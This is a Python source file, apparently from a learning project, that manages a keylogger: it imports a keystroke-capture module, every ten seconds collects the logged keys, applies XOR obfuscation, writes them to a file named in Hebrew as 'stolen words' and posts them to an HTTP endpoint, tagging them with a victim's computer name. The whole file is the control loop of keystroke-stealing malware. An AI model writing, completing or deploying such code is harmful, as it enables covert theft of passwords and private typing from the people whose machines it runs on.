import upload
from flask import Flask, request, jsonify
import requests
from requests import api
from werkzeug import http
from the_keylogger import Ikeylogger
#from The_filewriter import IWriter
from network_writer import NetworkWriter
from typing import  Optional
from FileWriter import FileWriter
from The_encryptor import Encryption

import time
  # שניות
  # שניות


class KeyLoggerManager():
    def __init__(self):
        # create listener
        self.keylog=Ikeylogger()
        self.file_writer=FileWriter("מילים גזולות")
#        self.PERIOD=float(30)
        self.to_stop=False
        endpoint="http://127.0.0.1:5000/data"
        self.networks=NetworkWriter(endpoint)
        self.period=float(10)
        self.encrypt=Encryption()




        # create filewriter
        # create encryptor
          # שניות

    def do_work(self):

        # call listener start

        data_received = self.keylog.get_logged_keys()
        payload = "".join(map(str, data_received))
        payload_encrypted=Encryption.encryption_xor(payload)
        self.file_writer.send_data(f" {payload_encrypted}","מחשב של זאב")
        self.networks.send_data( f"{payload_encrypted}","המחשב של זאב")
#        reply = self.networks.send_data(payload, "המחשב של זאב")
 #       print("server replied:", reply)

        data_reset=self.keylog.Reset_information()
        return data_reset

        #self.file_writer.send_data(str(data_received,"המחשב של זאב"))


    def run(self):
     #   next_t = time.monotonic()
        self.keylog.start_logging()
        while True:
         #   start = time.monotonic()
            time.sleep(self.period)
            if self.to_stop:
                self.keylog.stop_logging()
                break
            self.do_work()

          #  next_t += self.PERIOD
           # sleep_for = max(0.0, next_t - time.monotonic())






        # loop while (True or stops after some time???)
        # sleep some time (20 seconds)
        # get data from listener
        # call filewriter function to write data to file
        # call encryptor function to encrypt the file
        # send to server



if __name__=="__main__":
    manager=KeyLoggerManager()
    manager.run()

    input()